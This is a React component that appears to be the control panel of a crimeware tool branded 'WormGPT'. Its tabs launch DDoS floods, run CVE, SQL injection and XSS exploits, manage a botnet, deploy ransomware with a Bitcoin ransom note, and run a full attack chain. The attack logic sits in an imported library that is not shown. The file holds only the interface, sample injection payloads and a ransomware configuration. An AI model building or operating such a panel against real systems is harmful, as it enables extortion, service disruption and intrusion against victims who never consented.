'use client';

import { useState, useEffect } from 'react';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Textarea } from '@/components/ui/textarea';
import { Badge } from '@/components/ui/badge';
import { Alert, AlertDescription } from '@/components/ui/alert';
import { 
  Play, 
  Stop, 
  RefreshCw, 
  Download, 
  Upload, 
  Target, 
  Shield, 
  Zap,
  Server,
  Activity,
  AlertTriangle,
  CheckCircle,
  XCircle
} from 'lucide-react';
import WormGPTComplete, { 
  ExploitResult, 
  DDoSAttack, 
  BotnetNode,
  RansomwareConfig 
} from '@/lib/wormgpt-complete';

export default function WormGPTInterface() {
  const [wormgpt] = useState(() => new WormGPTComplete());
  const [target, setTarget] = useState('');
  const [attackMethod, setAttackMethod] = useState('SYN');
  const [intensity, setIntensity] = useState(100);
  const [threads, setThreads] = useState(50);
  const [exploitId, setExploitId] = useState('CVE-2023-1234');
  const [sqlPayload, setSqlPayload] = useState("' OR '1'='1");
  const [xssPayload, setXssPayload] = useState('<script>alert("XSS")</script>');
  const [backdoorType, setBackdoorType] = useState('Reverse Shell');
  const [bitcoinAddress, setBitcoinAddress] = useState('1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa');
  const [ransomAmount, setRansomAmount] = useState('2.5');
  const [consoleOutput, setConsoleOutput] = useState<string[]>([]);
  const [isLoading, setIsLoading] = useState(false);
  const [activeAttacks, setActiveAttacks] = useState<DDoSAttack[]>([]);
  const [botnetNodes, setBotnetNodes] = useState<BotnetNode[]>([]);
  const [exploitResults, setExploitResults] = useState<ExploitResult[]>([]);

  const addConsoleMessage = (message: string, type: 'info' | 'success' | 'error' = 'info') => {
    const timestamp = new Date().toLocaleTimeString();
    const prefix = type === 'success' ? '✅' : type === 'error' ? '❌' : 'ℹ️';
    setConsoleOutput(prev => [...prev, `[${timestamp}] ${prefix} ${message}`]);
  };

  const startDDoSAttack = async () => {
    if (!target) {
      addConsoleMessage('Please enter a target', 'error');
      return;
    }

    setIsLoading(true);
    addConsoleMessage(`Starting ${attackMethod} attack on ${target}...`, 'info');

    try {
      let result;
      if (attackMethod.includes('Layer4')) {
        result = await wormgpt.networkAttacks.startLayer4Attack(target, attackMethod, intensity);
      } else {
        result = await wormgpt.networkAttacks.startLayer7Attack(target, attackMethod, threads);
      }

      if (result.success) {
        addConsoleMessage(result.details, 'success');
        updateActiveAttacks();
      } else {
        addConsoleMessage('Attack failed', 'error');
      }
    } catch (error) {
      addConsoleMessage(`Error: ${error}`, 'error');
    } finally {
      setIsLoading(false);
    }
  };

  const scanBotnet = async () => {
    setIsLoading(true);
    addConsoleMessage('Scanning for botnet nodes...', 'info');

    try {
      const nodes = await wormgpt.networkAttacks.scanBotnetNodes('192.168.1.0/24');
      setBotnetNodes(nodes);
      addConsoleMessage(`Found ${nodes.length} potential botnet nodes`, 'success');
    } catch (error) {
      addConsoleMessage(`Error: ${error}`, 'error');
    } finally {
      setIsLoading(false);
    }
  };

  const runExploit = async (type: 'cve' | 'sql' | 'xss') => {
    if (!target) {
      addConsoleMessage('Please enter a target', 'error');
      return;
    }

    setIsLoading(true);
    addConsoleMessage(`Running ${type} exploit on ${target}...`, 'info');

    try {
      let result;
      switch (type) {
        case 'cve':
          result = await wormgpt.exploitFramework.exploitTarget(target, exploitId);
          break;
        case 'sql':
          result = await wormgpt.exploitFramework.sqlInjection(target, sqlPayload);
          break;
        case 'xss':
          result = await wormgpt.exploitFramework.xssScan(target);
          break;
      }

      setExploitResults(prev => [...prev, result]);
      addConsoleMessage(result.details, result.success ? 'success' : 'error');
    } catch (error) {
      addConsoleMessage(`Error: ${error}`, 'error');
    } finally {
      setIsLoading(false);
    }
  };

  const runFullExploitChain = async () => {
    if (!target) {
      addConsoleMessage('Please enter a target', 'error');
      return;
    }

    setIsLoading(true);
    addConsoleMessage(`Starting full exploit chain on ${target}...`, 'info');

    try {
      const results = await wormgpt.executeFullExploitChain(target);
      
      results.forEach((result, index) => {
        setTimeout(() => {
          addConsoleMessage(`Phase ${index + 1}: ${result.details}`, result.success ? 'success' : 'error');
        }, index * 2000);
      });

      setExploitResults(prev => [...prev, ...results]);
    } catch (error) {
      addConsoleMessage(`Error: ${error}`, 'error');
    } finally {
      setIsLoading(false);
    }
  };

  const deployRansomware = async () => {
    if (!target) {
      addConsoleMessage('Please enter a target', 'error');
      return;
    }

    setIsLoading(true);
    addConsoleMessage(`Deploying ransomware on ${target}...`, 'info');

    try {
      const config: RansomwareConfig = {
        encryptionKey: 'AES256-KEY-' + Math.random().toString(36).substr(2, 9),
        targetExtensions: ['.doc', '.docx', '.xls', '.xlsx', '.pdf', '.jpg', '.png', '.db'],
        ransomNote: `Your files have been encrypted! Send ${ransomAmount} BTC to ${bitcoinAddress}`,
        bitcoinAddress,
        deadline: new Date(Date.now() + 72 * 60 * 60 * 1000).toISOString()
      };

      const result = await wormgpt.ransomwareBuilder.deployRansomware(target, config);
      setExploitResults(prev => [...prev, result]);
      addConsoleMessage(result.details, result.success ? 'success' : 'error');
    } catch (error) {
      addConsoleMessage(`Error: ${error}`, 'error');
    } finally {
      setIsLoading(false);
    }
  };

  const updateActiveAttacks = () => {
    const attacks = wormgpt.networkAttacks.getActiveAttacks();
    setActiveAttacks(attacks);
  };

  const stopAttack = (attackId: string) => {
    const success = wormgpt.networkAttacks.stopAttack(attackId);
    if (success) {
      addConsoleMessage(`Attack ${attackId} stopped`, 'info');
      updateActiveAttacks();
    }
  };

  const addBotToBotnet = async () => {
    if (!target) {
      addConsoleMessage('Please enter a bot IP', 'error');
      return;
    }

    try {
      const result = await wormgpt.botnetController.addBot(target, 22);
      addConsoleMessage(result.details, result.success ? 'success' : 'error');
      scanBotnet();
    } catch (error) {
      addConsoleMessage(`Error: ${error}`, 'error');
    }
  };

  const clearConsole = () => {
    setConsoleOutput([]);
  };

  const exportResults = () => {
    const data = {
      exploitResults,
      activeAttacks,
      botnetNodes,
      timestamp: new Date().toISOString()
    };
    
    const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `wormgpt-results-${Date.now()}.json`;
    a.click();
    URL.revokeObjectURL(url);
    
    addConsoleMessage('Results exported successfully', 'success');
  };

  useEffect(() => {
    const interval = setInterval(() => {
      updateActiveAttacks();
    }, 5000);

    return () => clearInterval(interval);
  }, []);

  const availableExploits = wormgpt.exploitFramework.getAvailableExploits();
  const botnetStats = wormgpt.botnetController.getBotnetStats();

  return (
    <div className="min-h-screen bg-black text-green-400 p-6">
      <div className="max-w-7xl mx-auto">
        <div className="text-center mb-8">
          <h1 className="text-4xl font-bold text-red-500 mb-2 flex items-center justify-center gap-3">
            <Zap className="w-10 h-10" />
            WormGPT v53.0 - Offensive Security Framework
            <Zap className="w-10 h-10" />
          </h1>
          <p className="text-green-300 text-lg">
            Advanced penetration testing and security research platform
          </p>
        </div>

        <Tabs defaultValue="ddos" className="space-y-6">
          <TabsList className="bg-gray-900 border border-green-500">
            <TabsTrigger value="ddos" className="data-[state=active]:bg-red-900">
              <Zap className="w-4 h-4 mr-2" />
              DDoS Attacks
            </TabsTrigger>
            <TabsTrigger value="exploits" className="data-[state=active]:bg-red-900">
              <Target className="w-4 h-4 mr-2" />
              Exploits
            </TabsTrigger>
            <TabsTrigger value="botnet" className="data-[state=active]:bg-red-900">
              <Server className="w-4 h-4 mr-2" />
              Botnet
            </TabsTrigger>
            <TabsTrigger value="ransomware" className="data-[state=active]:bg-red-900">
              <Shield className="w-4 h-4 mr-2" />
              Ransomware
            </TabsTrigger>
            <TabsTrigger value="chain" className="data-[state=active]:bg-red-900">
              <Activity className="w-4 h-4 mr-2" />
              Exploit Chain
            </TabsTrigger>
          </TabsList>

          {/* DDoS Tab */}
          <TabsContent value="ddos">
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              <Card className="bg-gray-900 border border-green-500">
                <CardHeader>
                  <CardTitle className="text-red-400">DDoS Attack Configuration</CardTitle>
                  <CardDescription>Configure and launch DDoS attacks</CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div>
                    <Label htmlFor="target">Target IP/Domain</Label>
                    <Input
                      id="target"
                      value={target}
                      onChange={(e) => setTarget(e.target.value)}
                      placeholder="192.168.1.1 or example.com"
                      className="bg-gray-800 border-green-500 text-green-300"
                    />
                  </div>
                  
                  <div>
                    <Label htmlFor="attackMethod">Attack Method</Label>
                    <Select value={attackMethod} onValueChange={setAttackMethod}>
                      <SelectTrigger className="bg-gray-800 border-green-500">
                        <SelectValue />
                      </SelectTrigger>
                      <SelectContent className="bg-gray-800 border-green-500">
                        <SelectItem value="SYN">Layer 4 - SYN Flood</SelectItem>
                        <SelectItem value="UDP">Layer 4 - UDP Flood</SelectItem>
                        <SelectItem value="ICMP">Layer 4 - ICMP Flood</SelectItem>
                        <SelectItem value="HTTP-GET">Layer 7 - HTTP GET</SelectItem>
                        <SelectItem value="HTTP-POST">Layer 7 - HTTP POST</SelectItem>
                        <SelectItem value="Slowloris">Layer 7 - Slowloris</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>

                  {attackMethod.includes('Layer4') ? (
                    <div>
                      <Label htmlFor="intensity">Intensity (packets/second)</Label>
                      <Input
                        id="intensity"
                        type="number"
                        value={intensity}
                        onChange={(e) => setIntensity(parseInt(e.target.value))}
                        className="bg-gray-800 border-green-500 text-green-300"
                      />
                    </div>
                  ) : (
                    <div>
                      <Label htmlFor="threads">Thread Count</Label>
                      <Input
                        id="threads"
                        type="number"
                        value={threads}
                        onChange={(e) => setThreads(parseInt(e.target.value))}
                        className="bg-gray-800 border-green-500 text-green-300"
                      />
                    </div>
                  )}

                  <div className="flex gap-2">
                    <Button 
                      onClick={startDDoSAttack} 
                      disabled={isLoading}
                      className="bg-red-600 hover:bg-red-700"
                    >
                      <Play className="w-4 h-4 mr-2" />
                      Launch Attack
                    </Button>
                    
                    <Button 
                      onClick={scanBotnet}
                      disabled={isLoading}
                      className="bg-green-600 hover:bg-green-700"
                    >
                      <RefreshCw className="w-4 h-4 mr-2" />
                      Scan Botnet
                    </Button>
                  </div>
                </CardContent>
              </Card>

              <Card className="bg-gray-900 border border-green-500">
                <CardHeader>
                  <CardTitle className="text-red-400">Active Attacks</CardTitle>
                  <CardDescription>Monitor running attacks</CardDescription>
                </CardHeader>
                <CardContent>
                  <div className="space-y-2 max-h-64 overflow-y-auto">
                    {activeAttacks.map((attack) => (
                      <div key={attack.id} className="flex items-center justify-between p-2 bg-gray-800 rounded border border-green-500">
                        <div>
                          <div className="font-mono text-sm">{attack.target}</div>
                          <div className="text-xs text-green-300">{attack.method}</div>
                          <div className="text-xs text-green-400">
                            Packets: {attack.stats.packetsSent.toLocaleString()} | 
                            Bandwidth: {attack.stats.bandwidth} | 
                            Success: {attack.stats.successRate.toFixed(1)}%
                          </div>
                        </div>
                        <Badge className={attack.status === 'running' ? 'bg-red-600' : 'bg-green-600'}>
                          {attack.status}
                        </Badge>
                        {attack.status === 'running' && (
                          <Button
                            size="sm"
                            variant="destructive"
                            onClick={() => stopAttack(attack.id)}
                            className="ml-2"
                          >
                            <Stop className="w-3 h-3" />
                          </Button>
                        )}
                      </div>
                    ))}
                    {activeAttacks.length === 0 && (
                      <div className="text-center text-green-300 py-4">
                        No active attacks
                      </div>
                    )}
                  </div>
                </CardContent>
              </Card>
            </div>
          </TabsContent>

          {/* Exploits Tab */}
          <TabsContent value="exploits">
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
              <Card className="bg-gray-900 border border-green-500">
                <CardHeader>
                  <CardTitle className="text-red-400">CVE Exploits</CardTitle>
                  <CardDescription>Exploit known vulnerabilities</CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div>
                    <Label htmlFor="exploitId">CVE ID</Label>
                    <Select value={exploitId} onValueChange={setExploitId}>
                      <SelectTrigger className="bg-gray-800 border-green-500">
                        <SelectValue />
                      </SelectTrigger>
                      <SelectContent className="bg-gray-800 border-green-500">
                        {availableExploits.map((exploit) => (
                          <SelectItem key={exploit.id} value={exploit.id}>
                            {exploit.id} - {exploit.name}
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                  </div>
                  
                  <Button 
                    onClick={() => runExploit('cve')}
                    disabled={isLoading}
                    className="bg-red-600 hover:bg-red-700 w-full"
                  >
                    <Target className="w-4 h-4 mr-2" />
                    Exploit CVE
                  </Button>
                </CardContent>
              </Card>

              <Card className="bg-gray-900 border border-green-500">
                <CardHeader>
                  <CardTitle className="text-red-400">SQL Injection</CardTitle>
                  <CardDescription>Test SQL vulnerabilities</CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div>
                    <Label htmlFor="sqlPayload">SQL Payload</Label>
                    <Textarea
                      id="sqlPayload"
                      value={sqlPayload}
                      onChange={(e) => setSqlPayload(e.target.value)}
                      className="bg-gray-800 border-green-500 text-green-300 font-mono text-sm"
                      rows={3}
                    />
                  </div>
                  
                  <Button 
                    onClick={() => runExploit('sql')}
                    disabled={isLoading}
                    className="bg-red-600 hover:bg-red-700 w-full"
                  >
                    <Target className="w-4 h-4 mr-2" />
                    Test SQLi
                  </Button>
                </CardContent>
              </Card>

              <Card className="bg-gray-900 border border-green-500">
                <CardHeader>
                  <CardTitle className="text-red-400">XSS Scanner</CardTitle>
                  <CardDescription>Find XSS vulnerabilities</CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div>
                    <Label htmlFor="xssPayload">XSS Payload</Label>
                    <Textarea
                      id="xssPayload"
                      value={xssPayload}
                      onChange={(e) => setXssPayload(e.target.value)}
                      className="bg-gray-800 border-green-500 text-green-300 font-mono text-sm"
                      rows={3}
                    />
                  </div>
                  
                  <Button 
                    onClick={() => runExploit('xss')}
                    disabled={isLoading}
                    className="bg-red-600 hover:bg-red-700 w-full"
                  >
                    <Target className="w-4 h-4 mr-2" />
                    Scan XSS
                  </Button>
                </CardContent>
              </Card>
            </div>
          </TabsContent>

          {/* Botnet Tab */}
          <TabsContent value="botnet">
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              <Card className="bg-gray-900 border border-green-500">
                <CardHeader>
                  <CardTitle className="text-red-400">Botnet Management</CardTitle>
                  <CardDescription>Control botnet nodes</CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <div className="text-2xl font-bold text-green-400">{botnetStats.total}</div>
                      <div className="text-sm text-green-300">Total Bots</div>
                    </div>
                    <div>
                      <div className="text-2xl font-bold text-green-400">{botnetStats.active}</div>
                      <div className="text-sm text-green-300">Active Bots</div>
                    </div>
                    <div>
                      <div className="text-2xl font-bold text-green-400">{botnetStats.totalCpu}</div>
                      <div className="text-sm text-green-300">Total CPU Cores</div>
                    </div>
                    <div>
                      <div className="text-2xl font-bold text-green-400">{botnetStats.totalMemory}GB</div>
                      <div className="text-sm text-green-300">Total Memory</div>
                    </div>
                  </div>
                  
                  <Button 
                    onClick={addBotToBotnet}
                    disabled={isLoading}
                    className="bg-green-600 hover:bg-green-700 w-full"
                  >
                    <Server className="w-4 h-4 mr-2" />
                    Add Bot to Network
                  </Button>
                </CardContent>
              </Card>

              <Card className="bg-gray-900 border border-green-500">
                <CardHeader>
                  <CardTitle className="text-red-400">Botnet Nodes</CardTitle>
                  <CardDescription>Connected botnet nodes</CardDescription>
                </CardHeader>
                <CardContent>
                  <div className="space-y-2 max-h-64 overflow-y-auto">
                    {botnetNodes.map((node) => (
                      <div key={node.id} className="flex items-center justify-between p-2 bg-gray-800 rounded border border-green-500">
                        <div>
                          <div className="font-mono text-sm">{node.ip}:{node.port}</div>
                          <div className="text-xs text-green-300">{node.os}</div>
                          <div className="text-xs text-green-400">
                            {node.cpu} | {node.memory}
                          </div>
                        </div>
                        <Badge className={node.status === 'active' ? 'bg-green-600' : 'bg-red-600'}>
                          {node.status}
                        </Badge>
                      </div>
                    ))}
                    {botnetNodes.length === 0 && (
                      <div className="text-center text-green-300 py-4">
                        No botnet nodes connected
                      </div>
                    )}
                  </div>
                </CardContent>
              </Card>
            </div>
          </TabsContent>

          {/* Ransomware Tab */}
          <TabsContent value="ransomware">
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              <Card className="bg-gray-900 border border-green-500">
                <CardHeader>
                  <CardTitle className="text-red-400">Ransomware Builder</CardTitle>
                  <CardDescription>Build custom ransomware</CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div>
                    <Label htmlFor="bitcoinAddress">Bitcoin Address</Label>
                    <Input
                      id="bitcoinAddress"
                      value={bitcoinAddress}
                      onChange={(e) => setBitcoinAddress(e.target.value)}
                      placeholder="1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
                      className="bg-gray-800 border-green-500 text-green-300"
                    />
                  </div>
                  
                  <div>
                    <Label htmlFor="ransomAmount">Ransom Amount (BTC)</Label>
                    <Input
                      id="ransomAmount"
                      type="number"
                      step="0.1"
                      value={ransomAmount}
                      onChange={(e) => setRansomAmount(e.target.value)}
                      className="bg-gray-800 border-green-500 text-green-300"
                    />
                  </div>
                  
                  <Button 
                    onClick={deployRansomware}
                    disabled={isLoading}
                    className="bg-red-600 hover:bg-red-700 w-full"
                  >
                    <Shield className="w-4 h-4 mr-2" />
                    Deploy Ransomware
                  </Button>
                </CardContent>
              </Card>

              <Card className="bg-gray-900 border border-green-500">
                <CardHeader>
                  <CardTitle className="text-red-400">Ransomware Statistics</CardTitle>
                  <CardDescription>Deployment status</CardDescription>
                </CardHeader>
                <CardContent>
                  <Alert className="bg-red-900 border-red-500">
                    <AlertTriangle className="h-4 w-4" />
                    <AlertDescription>
                      Ransomware deployment is irreversible. Ensure you have proper authorization.
                    </AlertDescription>
                  </Alert>
                </CardContent>
              </Card>
            </div>
          </TabsContent>

          {/* Exploit Chain Tab */}
          <TabsContent value="chain">
            <Card className="bg-gray-900 border border-green-500">
              <CardHeader>
                <CardTitle className="text-red-400">Full Exploit Chain</CardTitle>
                <CardDescription>Execute complete attack sequence</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div>
                  <Label htmlFor="chainTarget">Target System</Label>
                  <Input
                    id="chainTarget"
                    value={target}
                    onChange={(e) => setTarget(e.target.value)}
                    placeholder="Enter target IP or domain"
                    className="bg-gray-800 border-green-500 text-green-300"
                  />
                </div>
                
                <div className="bg-gray-800 p-4 rounded border border-green-500">
                  <h4 className="text-green-300 font-semibold mb-2">Attack Phases:</h4>
                  <ol className="list-decimal list-inside space-y-1 text-sm text-green-300">
                    <li>Reconnaissance - Gather target information</li>
                    <li>Initial Access - Exploit vulnerabilities</li>
                    <li>Persistence - Install backdoors</li>
                    <li>Privilege Escalation - Gain higher privileges</li>
                    <li>Credential Access - Dump credentials</li>
                    <li>Lateral Movement - Move to other systems</li>
                    <li>Collection - Gather sensitive data</li>
                    <li>Impact - Deploy ransomware</li>
                  </ol>
                </div>
                
                <Button 
                  onClick={runFullExploitChain}
                  disabled={isLoading}
                  className="bg-red-600 hover:bg-red-700 w-full"
                >
                  <Activity className="w-4 h-4 mr-2" />
                  Execute Full Chain
                </Button>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>

        {/* Console Output */}
        <Card className="bg-gray-900 border border-green-500 mt-6">
          <CardHeader className="flex flex-row items-center justify-between">
            <div>
              <CardTitle className="text-red-400">Console Output</CardTitle>
              <CardDescription>Real-time attack logs</CardDescription>
            </div>
            <div className="flex gap-2">
              <Button
                size="sm"
                variant="outline"
                onClick={exportResults}
                className="border-green-500 text-green-300 hover:bg-green-900"
              >
                <Download className="w-4 h-4 mr-2" />
                Export
              </Button>
              <Button
                size="sm"
                variant="outline"
                onClick={clearConsole}
                className="border-green-500 text-green-300 hover:bg-green-900"
              >
                Clear
              </Button>
            </div>
          </CardHeader>
          <CardContent>
            <div className="bg-black p-4 rounded border border-green-500 font-mono text-sm max-h-64 overflow-y-auto">
              {consoleOutput.map((line, index) => (
                <div key={index} className="text-green-300 whitespace-pre-wrap">
                  {line}
                </div>
              ))}
              {consoleOutput.length === 0 && (
                <div className="text-green-500 text-center">
                  Console ready. Execute commands to see output.
                </div>
              )}
            </div>
          </CardContent>
        </Card>

        {/* Results Summary */}
        <Card className="bg-gray-900 border border-green-500 mt-6">
          <CardHeader>
            <CardTitle className="text-red-400">Exploit Results</CardTitle>
            <CardDescription>Summary of successful exploits</CardDescription>
          </CardHeader>
          <CardContent>
            <div className="space-y-2 max-h-48 overflow-y-auto">
              {exploitResults.slice(-10).map((result, index) => (
                <div key={index} className={`flex items-center gap-2 p-2 rounded border ${
                  result.success ? 'bg-green-900 border-green-500' : 'bg-red-900 border-red-500'
                }`}>
                  {result.success ? (
                    <CheckCircle className="w-4 h-4 text-green-400" />
                  ) : (
                    <XCircle className="w-4 h-4 text-red-400" />
                  )}
                  <div className="flex-1">
                    <div className="font-mono text-sm">{result.method}</div>
                    <div className="text-xs text-gray-300">{result.details}</div>
                  </div>
                  <Badge variant={result.success ? 'success' : 'destructive'}>
                    {result.success ? 'SUCCESS' : 'FAILED'}
                  </Badge>
                </div>
              ))}
              {exploitResults.length === 0 && (
                <div className="text-center text-green-300 py-4">
                  No exploit results yet
                </div>
              )}
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
}